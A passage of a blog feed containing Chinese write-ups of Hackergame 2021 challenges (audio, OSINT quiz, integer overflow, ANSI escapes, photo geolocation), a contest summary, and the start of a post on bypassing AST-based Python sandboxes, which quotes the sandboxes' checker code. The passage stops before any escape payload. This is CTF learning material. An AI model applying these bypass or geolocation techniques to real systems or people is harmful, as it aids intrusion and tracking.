也可以直接得到右侧的flag。</p><p>（**当时这题抄串行了两三次……）</p><hr><h2 id="去吧！追寻自由的电波"><a href="#去吧！追寻自由的电波" class="headerlink" title="去吧！追寻自由的电波"></a>去吧！追寻自由的电波</h2><blockquote><p>当然，如果只是这样还远远不够。遵依史称“老爹”的上古先贤的至理名言，必须要“用魔法打败魔法”。X 同学向上级申请到了科大西区同步辐射实验室设备的使用权限，以此打通次元空间，借助到另一个平行宇宙中 Z 同学的法力进行数据对冲，方才于乱中搏得一丝机会，将 flag 用无线电的形式发射了出去。</p><p>考虑到信息的鲁棒性，X 同学使用了无线电中惯用的方法来区分字符串中读音相近的字母。即使如此，打破次元的强大能量扭曲了时空，使得最终接受到的录音的速度有所改变。</p></blockquote><p>（这题在群里看起来好像卡了很多人，不知道为什么）<br>题目下载下来是一个听起来杂乱的音频</p><p>题里最后说了 “最终接受到的录音的<strong>速度</strong>有所改变”，所以考虑将音频时间拉长。<br>最开始使用了 Adobe Audition，但是效果不是很理想，大概是重新采样等一系列算法导致的<br>所以换了 Adobe Premier Pro 直接用比率拉伸工具拉长音频，还是可以听清的<br>不断尝试之后，大概放慢三倍左右就可以听出读的是英语单词了</p><p>题里说到了 “考虑到信息的鲁棒性，X 同学使用了<strong>无线电中惯用的方法</strong>来区分字符串中读音相近的字母”，所以就查到了<a href="https://zhuanlan.zhihu.com/p/101866561">国际航空无线电通讯26个英文字母读法</a><br>然后仔细听，辨别每个单词的第一个音就可以得到 flag 了</p><hr><h2 id="猫咪问答-Pro-Max"><a href="#猫咪问答-Pro-Max" class="headerlink" title="猫咪问答 Pro Max"></a>猫咪问答 Pro Max</h2><p>五道刁钻的题目，但是还是好查到的，题目里也说了“解出谜题不需要是科大在校学生”</p><blockquote><ol><li>2017 年，中科大信息安全俱乐部（SEC@USTC）并入中科大 Linux 用户协会（USTCLUG）。目前，信息安全俱乐部的域名（sec.ustc.edu.cn）已经无法访问，但你能找到信息安全俱乐部的社团章程在哪一天的会员代表大会上通过的吗？</li></ol></blockquote><p>看到了 “目前，已经无法访问” 说明这个域名曾经是可以访问的，直接通过<del>互联网的记忆</del>archive.org，查到这个域名的历史存档，随便找一天就可以看到他们官网中的<a href="https://web.archive.org/web/20170613090934/http://sec.ustc.edu.cn/doku.php/codes">信息安全俱乐部社团章程</a>。<br>其中第一行就写了 “本章程在 <em>2015 年 5 月 4 日</em>，经会员代表大会审议通过。”</p><p>所以答案就是 <strong>20150504</strong></p><blockquote><ol start="2"><li>中国科学技术大学 Linux 用户协会在近五年多少次被评为校五星级社团？</li></ol></blockquote><p>直接去科大 LUG 官网的 <a href="https://lug.ustc.edu.cn/wiki/intro/">Intro 页面</a>，就可以看到 “于 2015 年 5 月、2017 年 7 月、2018 年 9 月、2019 年 8 月及 2020 年 9 月被评为中国科学技术大学五星级学生社团。”<br>所以是4次（x<br>但是怀疑一下为什么没有2021年，因为都是在9月份左右，所以可能是数据没更新，这题4和5都有可能</p><p>尝试后得到答案是 <strong>5</strong></p><blockquote><ol start="3"><li>中国科学技术大学 Linux 用户协会位于西区图书馆的活动室门口的牌子上“LUG @ USTC”下方的小字是？</li></ol></blockquote><p>这题也简单，直接问科大同学就好了（x<br>翻了 LUG 的微信公众号和 QQ 官方号，都没啥收获，最后发现官网上有 <a href="https://lug.ustc.edu.cn/news/">News</a>。这样的话，如果新启用活动室的话，一定会有一篇新闻稿，搜索“图书馆”得到了<a href="https://lug.ustc.edu.cn/news/2016/06/new-activity-room-in-west-library/">「西区图书馆新活动室启用」</a>这篇文章，开篇第一张大图就是门口牌子的照片</p><p>所以答案是 <strong>Development Team of Library</strong> （注意大小写）</p><blockquote><ol start="4"><li>在 SIGBOVIK 2021 的一篇关于二进制 Newcomb-Benford 定律的论文中，作者一共展示了多少个数据集对其理论结果进行验证？</li></ol></blockquote><p>应该没必要搜谷歌学术之类的，直接必应查 “SIGBOVIK Newcomb-Benford” 就可以找到 SIGBOVIK 的<a href="http://sigbovik.org/2021/proceedings.pdf">这一篇大文章合集</a>，再搜索 Newcomb 就可以看到题目里说的论文了。<br>全文也不长，只有四页，后两页全是数据的图，数一下，一共有13幅</p><p>所以答案是 <strong>13</strong></p><blockquote><ol start="5"><li>不严格遵循协议规范的操作着实令人生厌，好在 IETF 于 2021 年成立了 Protocol Police 以监督并惩戒所有违背 RFC 文档的行为个体。假如你发现了某位同学可能违反了协议规范，根据 Protocol Police 相关文档中规定的举报方法，你应该将你的举报信发往何处？</li></ol></blockquote><p>没啥好说的，直接查，答案 <strong>/dev/null</strong></p><p>然后提交就可以得到flag</p><hr><h2 id="卖瓜"><a href="#卖瓜" class="headerlink" title="卖瓜"></a>卖瓜</h2><p>题目里比较重要的话就是：</p><blockquote><p>补充说明：当称的数字变为浮点数而不是整数时，HQ 不会认可最终的称重结果。</p></blockquote><p>题目的目的也很明确，用一堆9和一堆6加起来得到20。肯定不能<del>像华强一样</del>劈瓜，所以输入一定是整数<br>那就可以考虑溢出<br>但是经过尝试，给的数字太大，就会使结果溢出到浮点数，这不是想要的（因为即使凑到了20.0也不正确）</p><p>那如果数字再大呢，比如 2000000000000000000（18个0）个9斤的瓜，可以发现，这时直接溢出到了负整型 -446744073709551616<br>再补上 49638230412172000 个9斤的瓜就可以得到 -3616，加上20可以被6整除，所以再加上606个6斤的瓜就可以得到 20</p><p><del>恭喜你逃过一劫！华强～华强！</del></p><hr><h2 id="透明的文件"><a href="#透明的文件" class="headerlink" title="透明的文件"></a>透明的文件</h2><blockquote><p>一个透明的文件，用于在终端中展示一个五颜六色的 flag。</p><p>可能是在 cmd.exe 等劣质终端中被长期使用的原因，这个文件失去了一些重要成分，变成了一堆乱码，也不会再显示出 flag 了。</p><p>注意：flag 内部的字符全部为小写字母。</p></blockquote><p>拿到文件，看到里面好多 <code>[ ; m</code> 之类的，再结合终端中输出带颜色文字的 <code>\033[...m;</code> 之类的方法，以及题目中的 “失去了一些<strong>重要成分</strong>”<br>所以直接尝试把 <code>[</code> 全局替换为 <code>\033[</code>，然后复制到 python 中 print，就可以看到神奇的一幕了（其实并没完全做完，但是可以已经看了）<br><img src="/p/fd872e78/transparent.png"><br>然后读出 flag 即可（全是小写字母）</p><hr><h2 id="旅行照片"><a href="#旅行照片" class="headerlink" title="旅行照片"></a>旅行照片</h2><blockquote><p>你的学长决定来一场说走就走的旅行。通过他发给你的照片来看，他应该是在酒店住下了。</p><p>从照片来看，酒店似乎在小区的一栋高楼里，附近还有一家 KFC 分店。突然，你意识到照片里透露出来的信息比表面上看起来的要多。</p><p>请观察照片并答对全部 5 道题以获取 flag。注意：图片未在其他地方公开发布过，也未采取任何隐写措施（通过手机拍摄屏幕亦可答题）。<br><img src="/p/fd872e78/travel-photo.jpg"></p></blockquote><p>“手机拍摄屏幕亦可答题”，所以照片中没有任何地址的元信息，只能靠看图<br><strong>线索</strong>：海边、KFC、高楼、大石头、停车位</p><p>先看那个KFC，大概是个网红店，所以搜索 “网红 海边 KFC”，查到了秦皇岛，而且也是海边<br>再进一步看地图和街景地图就可以确定地点在 <strong>秦皇岛新澳海底世界</strong></p><p>然后是5个问题</p><blockquote><p>该照片拍摄者的面朝方向为：</p></blockquote><p>根据地图，对比一下就可以得到，面朝方向是 <strong>东南</strong></p><blockquote><p>该照片的拍摄时间大致为：</p></blockquote><p>根据选项里的时间，下午是两点半左右，而在东北的两点半左右其实和中午差不多，影子和光温也不太像这个样子，所以可以确定时间大致是 <strong>傍晚</strong></p><blockquote><p>该照片的拍摄者所在楼层为：</p></blockquote><p>不好确定，但是答案可以交很多次，所以从9层左右依次试就可以了，最后得到楼层是 <strong>14</strong></p><blockquote><p>该照片左上角 KFC 分店的电话号码是：</p></blockquote><p>直接用地图软件搜 “秦皇岛新澳 KFC” 就可以查到那家店铺，也给了电话，或者搜索 ”网红 海边 KFC“ 也可以直接得到电话：<strong>0335-7168800</strong></p><blockquote><p>该照片左上角 KFC 分店左侧建筑有三个水平排列的汉字，它们是：</p></blockquote><p>通过街景地图就可以看到 KFC 左边的建筑上写了 <strong>海豚馆</strong></p><hr><p>看来写了不少了，剩下的简单题放到下一篇里_(:з」∠)_</p><h2 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h2><ul><li><a href="https://hack.lug.ustc.edu.cn/">Hackergame</a></li><li><a href="https://zhuanlan.zhihu.com/p/101866561">国际航空无线电通讯26个英文字母读法 - 知乎</a></li><li><a href="https://lug.ustc.edu.cn/">LUG@USTC 官网</a></li><li><a href="https://archive.org/">Wayback Machine archive.org</a></li><li><a href="http://sigbovik.org/2021/proceedings.pdf">SIGBOVIK 2021</a></li><li><a href="http://quanjing.baidu.com/">百度全景地图</a></li></ul><div style="display: flex; justify-content: space-between;"><p><a href="/p/c05d7b7c.html">&lt; #0</a></p><p><a href="/p/f54b44c.html">#2 &gt;</a></p></div>]]></content>
    
    
    <summary type="html">&lt;div style=&quot;display: flex; justify-content: space-between;&quot;&gt;

&lt;p&gt;&lt;a href=&quot;/p/c05d7b7c.html&quot;&gt;&amp;lt; #0&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;a href=&quot;/p/f54b44c.html&quot;&gt;#2 &amp;gt;&lt;/a&gt;&lt;/p&gt;
&lt;/div&gt;

&lt;p&gt;这篇 Writeup 写一下 Hackergame 2021 里面比较好做的一些题目做法（&lt;del&gt;以及吐槽&lt;/del&gt;）：&lt;br&gt;签到、十六进制、电波、猫咪问答、卖瓜、透明文件、旅行照片&lt;/p&gt;
&lt;p&gt;开局基本上就靠这些上分了（逃&lt;br&gt;也都是看上去就知道该怎么做，只是实现的难度不同了（&lt;/p&gt;</summary>
    
    
    
    <category term="Writeup" scheme="https://blog.tonycrane.cc/categories/Writeup/"/>
    
    
    <category term="CTF" scheme="https://blog.tonycrane.cc/tags/CTF/"/>
    
    <category term="Writeup" scheme="https://blog.tonycrane.cc/tags/Writeup/"/>
    
  </entry>
  
  <entry>
    <title>「Hackergame 2021」#0 赛后总结</title>
    <link href="https://blog.tonycrane.cc/p/c05d7b7c.html"/>
    <id>https://blog.tonycrane.cc/p/c05d7b7c.html</id>
    <published>2021-10-29T01:01:01.000Z</published>
    <updated>2022-02-16T07:45:11.666Z</updated>
    
    <content type="html"><![CDATA[<p>七天紧张刺激<del>破防</del>的 Hackergame 2021 终于结束了_(:з」∠)_<br>在这丢一个总结和 Writeup 链接。</p><h2 id="Writeup"><a href="#Writeup" class="headerlink" title="Writeup"></a>Writeup</h2><ul><li><a href="/p/fd872e78.html">「Hackergame 2021」#1 Writup 开局上分篇 0</a><br>  签到、十六进制、电波、猫咪问答、卖瓜、透明文件、旅行照片</li><li><a href="/p/f54b44c.html">「Hackergame 2021」#2 Writup 开局上分篇 1</a><br>  大砍刀、图之上、赛博厨房01、助记词1、p😭q</li><li><a href="/p/f152ab1f.html">「Hackergame 2021」#3 Writup 持续破防篇 0</a><br>  Amnesia1、RSA、LUKS、MicroWorld</li><li><a href="/p/d11ec8ed.html">「Hackergame 2021」#4 Writup 持续破防篇 1</a><br>  阵列恢复、马赛克、minecRaft、密码生成器</li></ul><span id="more"></span><h2 id="Summary"><a href="#Summary" class="headerlink" title="Summary"></a>Summary</h2><p>第一次参加 Hackergame，大概也算是第一次参加比较正式的 CTF 比赛。</p><p>这次的时间也比较难受，10月23日开始，然而当天有管乐团音乐会演出，要全天排练。24号去听了帝玖室内乐团的音乐会。剩下工作日的时间也要上课，还要复（预）习小测。<br>但还是抽出很长时间来打了 Hackergame。</p><p>经过七天，拿到了浙大组内第三、总排行第二十二的成绩<br><img src="/p/c05d7b7c/rank.jpg"><br>总之，非常感谢鼓励我（<del>拉入坑</del>）的 GZTime，感谢一直上分的 yyy 大佬和 Cage 学长督促我继续做题（<del>别卷啦</del>），感谢纳新群里活跃气氛的学长（不感谢膜），感谢容忍我凌晨一两点在寝室做题、第二天早上被一堆闹铃吵醒的室友，还要感谢没参加比赛来暴虐我的图灵大佬们（）</p><p>开赛的时候刚好乐团中午休息，于是在休息室做了几道题，接着一两天陆续把会的有思路的题做了。<br>然后就开始了破防阶段（）<br>一杯茶，一包烟，一道题目做一天（x<br>基本上每天除了上课写作业的所有时间都来打 hackergame 了（<del>中间做马赛克破防的夜晚出去闲逛了两个小时</del>）</p><p>总之我也才大一，刚接触 CTF 一个多月，这次打得也挺爽，不知道能不能借此混进 AAA（逃 </p><p>体验良好，但不完全良好，下次再来_(:з」∠)_</p><hr><p style="font-size: x-small; text-align: right;">声明：虽然总结和 Writeup 的创建时间在比赛结束前，但均在比赛结束后才发布到互联网</p>]]></content>
    
    
    <summary type="html">&lt;p&gt;七天紧张刺激&lt;del&gt;破防&lt;/del&gt;的 Hackergame 2021 终于结束了_(:з」∠)_&lt;br&gt;在这丢一个总结和 Writeup 链接。&lt;/p&gt;
&lt;h2 id=&quot;Writeup&quot;&gt;&lt;a href=&quot;#Writeup&quot; class=&quot;headerlink&quot; title=&quot;Writeup&quot;&gt;&lt;/a&gt;Writeup&lt;/h2&gt;&lt;ul&gt;
&lt;li&gt;&lt;a href=&quot;/p/fd872e78.html&quot;&gt;「Hackergame 2021」#1 Writup 开局上分篇 0&lt;/a&gt;&lt;br&gt;  签到、十六进制、电波、猫咪问答、卖瓜、透明文件、旅行照片&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;/p/f54b44c.html&quot;&gt;「Hackergame 2021」#2 Writup 开局上分篇 1&lt;/a&gt;&lt;br&gt;  大砍刀、图之上、赛博厨房01、助记词1、p😭q&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;/p/f152ab1f.html&quot;&gt;「Hackergame 2021」#3 Writup 持续破防篇 0&lt;/a&gt;&lt;br&gt;  Amnesia1、RSA、LUKS、MicroWorld&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;/p/d11ec8ed.html&quot;&gt;「Hackergame 2021」#4 Writup 持续破防篇 1&lt;/a&gt;&lt;br&gt;  阵列恢复、马赛克、minecRaft、密码生成器&lt;/li&gt;
&lt;/ul&gt;</summary>
    
    
    
    <category term="Writeup" scheme="https://blog.tonycrane.cc/categories/Writeup/"/>
    
    
    <category term="CTF" scheme="https://blog.tonycrane.cc/tags/CTF/"/>
    
    <category term="Writeup" scheme="https://blog.tonycrane.cc/tags/Writeup/"/>
    
  </entry>
  
  <entry>
    <title>绕过AST解析的python沙箱逃逸方法</title>
    <link href="https://blog.tonycrane.cc/p/6dee32d5.html"/>
    <id>https://blog.tonycrane.cc/p/6dee32d5.html</id>
    <published>2021-10-20T00:14:35.000Z</published>
    <updated>2021-11-29T16:06:21.782Z</updated>
    
    <content type="html"><![CDATA[<p>这类题是在zjusec.com上 ACTF 2019 分组中chenyuan出的一系列python沙箱逃逸题目中看到的<br>在网上搜索貌似也只能搜到 <a href="https://infosecwriteups.com/tokyowesterns-ctf-4th-2018-writeup-part-5-6d699f07f71c">TokyoWesterns CTF 4th 2018</a> 这一次比赛中的题目</p><h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><p>这类题目不像普通的沙箱逃逸一样通过删除内置函数字典或者删除某些模块的内容来实现<br>而是在输入命令后即使用python的 ast 模块对其进行语法分析，只要使用了某些禁止的抽象语法，就抛出异常导致程序中断</p><span id="more"></span><p>因为它直接使用 ast.parse 分析了语法，所以很难蒙混过关骗过 ast，这时就需要寻找题目中遍历语法树的漏洞了</p><h2 id="题目分析"><a href="#题目分析" class="headerlink" title="题目分析"></a>题目分析</h2><p>先来看看cy的pysandbox13，这个最终版的AST检查绕过</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br></pre></td><td class="code"><pre><span class="line">dbgprint = sys.stderr.write</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Traversal</span>():</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span>(<span class="params">self, node</span>):</span></span><br><span class="line">        self.tisiv(node)</span><br><span class="line"></span><br><span class="line">    depth = -<span class="number">1</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">tisiv</span>(<span class="params">self, nodes</span>):</span></span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> <span class="built_in">isinstance</span>(nodes, <span class="built_in">list</span>):</span><br><span class="line">            nodes = [nodes]</span><br><span class="line">        self.depth += <span class="number">1</span></span><br><span class="line">        <span class="keyword">for</span> node <span class="keyword">in</span> nodes:</span><br><span class="line">            func = <span class="built_in">getattr</span>(self, <span class="string">&#x27;tisiv_&#x27;</span> + node.__class__.__name__, <span class="literal">None</span>)</span><br><span class="line">            <span class="keyword">if</span> func:</span><br><span class="line">                dbgprint(<span class="string">&quot; &quot;</span>*self.depth + <span class="string">&quot;tisiv&quot;</span>[::-<span class="number">1</span>] +<span class="string">&quot;\t&quot;</span>+ node.__class__.__name__+<span class="string">&quot;\n&quot;</span>)</span><br><span class="line">                <span class="keyword">return</span> func(node)</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                <span class="keyword">if</span> <span class="keyword">not</span> <span class="built_in">isinstance</span>(node, ast.expr):</span><br><span class="line">                    <span class="keyword">raise</span> Exception(<span class="string">&quot;not allowed &quot;</span>+<span class="built_in">str</span>(node))</span><br><span class="line">        self.depth -= <span class="number">1</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">tisiv_Call</span>(<span class="params">self, node</span>):</span></span><br><span class="line">        <span class="keyword">raise</span> Exception(<span class="string">&quot;not allowed&quot;</span>)</span><br><span class="line">        self.tisiv(node.func)</span><br><span class="line">        self.tisiv(node.args)</span><br><span class="line">        self.tisiv(node.keywords)</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">tisiv_Attribute</span>(<span class="params">self, node</span>):</span></span><br><span class="line">        <span class="keyword">raise</span> Exception(<span class="string">&quot;not allowed&quot;</span>)</span><br><span class="line">        self.tisiv(node.value)</span><br><span class="line">        self.tisiv(node.attr)</span><br><span class="line">        self.tisiv(node.ctx)</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">tisiv_Import</span>(<span class="params">self, node</span>):</span></span><br><span class="line">        <span class="keyword">raise</span> Exception(<span class="string">&quot;not allowed&quot;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">tisiv_Module</span>(<span class="params">self, node</span>):</span></span><br><span class="line">        self.tisiv(node.body)</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">tisiv_BoolOp</span>(<span class="params">self, node</span>):</span></span><br><span class="line">        self.tisiv(node.values)</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">tisiv_BinOp</span>(<span class="params">self, node</span>):</span></span><br><span class="line">        self.tisiv(node.left)</span><br><span class="line">        self.tisiv(node.right)</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">tisiv_UnaryOp</span>(<span class="params">self, node</span>):</span></span><br><span class="line">        self.tisiv(node.operand)</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">tisiv_Lambda</span>(<span class="params">self, node</span>):</span></span><br><span class="line">        self.tisiv(node.body)</span><br><span class="line">        self.tisiv(node.args)</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">tisiv_IfExp</span>(<span class="params">self, node</span>):</span></span><br><span class="line">        self.tisiv(node.test)</span><br><span class="line">        self.tisiv(node.body)</span><br><span class="line">        self.tisiv(node.orelse)</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">tisiv_Dict</span>(<span class="params">self, node</span>):</span></span><br><span class="line">        self.tisiv(node.keys)</span><br><span class="line">        self.tisiv(node.values)</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">tisiv_Set</span>(<span class="params">self, node</span>):</span></span><br><span class="line">        self.tisiv(node.elts)</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">tisiv_ListComp</span>(<span class="params">self, node</span>):</span></span><br><span class="line">        self.tisiv(node.elt)</span><br><span class="line">        self.tisiv(node.generators)</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">tisiv_SetComp</span>(<span class="params">self, node</span>):</span></span><br><span class="line">        self.tisiv(node.elt)</span><br><span class="line">        self.tisiv(node.generators)</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">tisiv_DictComp</span>(<span class="params">self, node</span>):</span></span><br><span class="line">        self.tisiv(node.key)</span><br><span class="line">        self.tisiv(node.value)</span><br><span class="line">        self.tisiv(node.generators)</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">tisiv_GeneratorExp</span>(<span class="params">self, node</span>):</span></span><br><span class="line">        self.tisiv(node.elt)</span><br><span class="line">        self.tisiv(node.generators)</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">tisiv_Yield</span>(<span class="params">self, node</span>):</span></span><br><span class="line">        self.tisiv(node.value)</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">tisiv_Compare</span>(<span class="params">self, node</span>):</span></span><br><span class="line">        self.tisiv(node.left)</span><br><span class="line">        self.tisiv(node.comparators)</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">tisiv_Repr</span>(<span class="params">self, node</span>):</span></span><br><span class="line">        self.tisiv(node.value)</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">tisiv_Subscript</span>(<span class="params">self, node</span>):</span></span><br><span class="line">        self.tisiv(node.value)</span><br><span class="line">        self.tisiv(node.<span class="built_in">slice</span>)</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">tisiv_List</span>(<span class="params">self, node</span>):</span></span><br><span class="line">        self.tisiv(node.elts)</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">tisiv_Tuple</span>(<span class="params">self, node</span>):</span></span><br><span class="line">        self.tisiv(node.elts)</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">tisiv_Expr</span>(<span class="params">self, node</span>):</span></span><br><span class="line">        self.tisiv(node.value)</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">tisiv_JoinedStr</span>(<span class="params">self, node</span>):</span></span><br><span class="line">        self.tisiv(node.values)</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">tisiv_NameConstant</span>(<span class="params">self, node</span>):</span></span><br><span class="line">        <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line">Traversal(ast.parse(c))</span><br></pre></td></tr></table></figure><p>可以读出，它定义了一个 Traversal 类，在初始化的时候对传入的节点调用 tisiv 方法，即对其所有子节点继续逐层检查<br>如果 tisiv_{该节点类名} 已经有了存在的方法，就调用它，在那些方法中又分别对其子节点进行了检查<br>如果不存在这样的方法，就检测这个节点的语法类型是不是 ast.expr，如果不是就直接禁止</p><p>再看 TokyoWesterns CTF 4th 2018 这道题：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">check</span>(<span class="params">node</span>):</span></span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">isinstance</span>(node, <span class="built_in">list</span>):</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">all</span>([check(n) <span class="keyword">for</span> n <span class="keyword">in</span> node])</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        attributes = &#123;</span><br><span class="line">            <span class="string">&#x27;BoolOp&#x27;</span>: [<span class="string">&#x27;values&#x27;</span>],</span><br><span class="line">            <span class="string">&#x27;BinOp&#x27;</span>: [<span class="string">&#x27;left&#x27;</span>, <span class="string">&#x27;right&#x27;</span>],</span><br><span class="line">            <span class="string">&#x27;UnaryOp&#x27;</span>: [<span class="string">&#x27;operand&#x27;</span>],</span><br><span class="line">            <span class="string">&#x27;Lambda&#x27;</span>: [<span class="string">&#x27;body&#x27;</span>],</span><br><span class="line">            <span class="string">&#x27;IfExp&#x27;</span>: [<span class="string">&#x27;test&#x27;</span>, <span class="string">&#x27;body&#x27;</span>, <span class="string">&#x27;orelse&#x27;</span>],</span><br><span class="line">            <span class="string">&#x27;Dict&#x27;</span>: [<span class="string">&#x27;keys&#x27;</span>, <span class="string">&#x27;values&#x27;</span>],</span><br><span class="line">            <span class="string">&#x27;Set&#x27;</span>: [<span class="string">&#x27;elts&#x27;</span>],</span><br><span class="line">            <span class="string">&#x27;ListComp&#x27;</span>: [<span class="string">&#x27;elt&#x27;</span>, <span class="string">&#x27;generators&#x27;</span>],</span><br><span class="line">            <span class="string">&#x27;SetComp&#x27;</span>: [<span class="string">&#x27;elt&#x27;</span>, <span class="string">&#x27;generators&#x27;</span>],</span><br><span class="line">            <span class="string">&#x27;DictComp&#x27;</span>: [<span class="string">&#x27;key&#x27;</span>, <span class="string">&#x27;value&#x27;</span>, <span class="string">&#x27;generators&#x27;</span>],</span><br><span class="line">            <span class="string">&#x27;GeneratorExp&#x27;</span>: [<span class="string">&#x27;elt&#x27;</span>, <span class="string">&#x27;generators&#x27;</span>],</span><br><span class="line">            <span class="string">&#x27;Yield&#x27;</span>: [<span class="string">&#x27;value&#x27;</span>],</span><br><span class="line">            <span class="string">&#x27;Compare&#x27;</span>: [<span class="string">&#x27;left&#x27;</span>, <span class="string">&#x27;comparators&#x27;</span>],</span><br><span class="line">            <span class="string">&#x27;Call&#x27;</span>: <span class="literal">False</span>, <span class="comment"># call is not permitted</span></span><br><span class="line">            <span class="string">&#x27;Repr&#x27;</span>: [<span class="string">&#x27;value&#x27;</span>],</span><br><span class="line">            <span class="string">&#x27;Num&#x27;</span>: <span class="literal">True</span>,</span><br><span class="line">            <span class="string">&#x27;Str&#x27;</span>: <span class="literal">True</span>,</span><br><span class="line">            <span class="string">&#x27;Attribute&#x27;</span>: <span class="literal">False</span>, <span class="comment"># attribute is also not permitted</span></span><br><span class="line">            <span class="string">&#x27;Subscript&#x27;</span>: [<span class="string">&#x27;value&#x27;</span>],</span><br><span class="line">            <span class="string">&#x27;Name&#x27;</span>: <span 